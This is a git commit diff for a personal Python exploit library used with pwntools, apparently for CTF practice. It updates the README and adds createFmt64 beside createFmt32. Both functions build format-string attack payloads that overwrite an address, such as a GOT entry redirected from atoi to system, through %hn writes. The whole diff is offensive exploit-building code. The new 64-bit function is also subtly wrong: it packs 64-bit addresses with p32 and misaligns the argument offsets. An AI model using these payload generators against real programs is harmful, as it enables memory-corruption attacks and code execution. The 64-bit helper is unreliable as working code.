11addd435791a5a8cd7c2280a1b95e53d01fa442
BabyBlue0 <b1800799@planet.kanazawa-it.ac.jp>
2020-08-17 15:52:26 +0900

    add createFmt64 and modify README.md

--- README.md
+++ README.md
@@ -1,17 +1,16 @@
 # bayb0pwn
-own's pwn library.
-Use pwntools with this script.
-If it gets huge, it may be packaged.
+babyblue0's pwn library.  
+This script is used with pwntools.  
+If it gets huge, it may be packaged.  
 
-# addtion list
-- for format string attack, automake format function  
-  - createFmt32( dest, src, offset, start=0 )  
-    |args|description|
-    |--|--|
-    |dest|overwrite destination address|
-    |src|overwrite source address|
-    |offset|offset of printf's args |
-    |start=0|length of string already output( deafult is 0 )|
-    for example:  
-      createFmt32( elf.got["atoi"], elf.plt["system"], 7 )
+# function list
+- createFmt(32|64)( dest, src, offset, start=0 )  
+  Automatic making the format of FSA.   
+  |args|description|
+  |--|--|
+  |dest|destination address you want to overwrite|
+  |src|source address you want to overwrite|
+  |offset|offset of printf's args |
+  |start=0|length of string already output( deafult is 0 )|
+  e.g.) `createFmt32( elf.got["atoi"], elf.plt["system"], 7 )`  
 
--- bayb0pwn.py
+++ bayb0pwn.py
@@ -1,5 +1,7 @@
+from pwn import *
+
 def createFmt32( dest, src, offset, start=0 ):
-  start +=8
+  start += 8
   upper2 = (src >> 16) & 0xffff
   lower2 = src & 0xffff
 
@@ -8,7 +10,29 @@ def createFmt32( dest, src, offset, start=0 ):
   fmt += p32( dest + 2 )
   fmt += b'%%%dc'%( lower2-start )
   fmt += b'%%%d$hn'%offset
-  fmt += b'%%%dc'%( upper2-lower2 if upper2>lower2 else upper2+(0x10000-lower2 ) )
+  fmt += b'%%%dc'%( upper2-lower2 if upper2>lower2 else upper2+(0x10000-lower2) )
   fmt += b'%%%d$hn'%(offset+1)
+  return fmt
+
+def createFmt64( dest, src, offset, start=0 ):
+  start += 16
+  upper2 = (src >> 48 ) & 0xffff
+  uppermiddle2 = (src >> 32 ) & 0xffff
+  lowermiddle2 = (src >> 16 ) & 0xffff 
+  lower2 = src & 0xffff
+
+  fmt = b''
+  fmt += p32( dest )
+  fmt += p32( dest + 2 )
+  fmt += p32( dest + 4 )
+  fmt += p32( dest + 6 )
+  fmt += b'%%%dc'%( lower2-start )
+  fmt += b'%%%d$hn'%offset
+  fmt += b'%%%dc'%( lowermiddle2-lower2 if lowermiddle2>lower2 else lowermiddle2+(0x10000-lower2 ) )
+  fmt += b'%%%d$hn'%(offset+1)
+  fmt += b'%%%dc'%( uppermiddle2-lowermiddle2 if uppermiddle2>lowermiddle2 else uppermiddle2+(0x10000-lowermiddle2 ) )
+  fmt += b'%%%d$hn'%(offset+2)
+  fmt += b'%%%dc'%( upper2-uppermiddle2 if upper2>uppermiddle2 else upper2+(0x10000-uppermiddle2 ) )
+  fmt += b'%%%d$hn'%(offset+3)
   return fmt
 
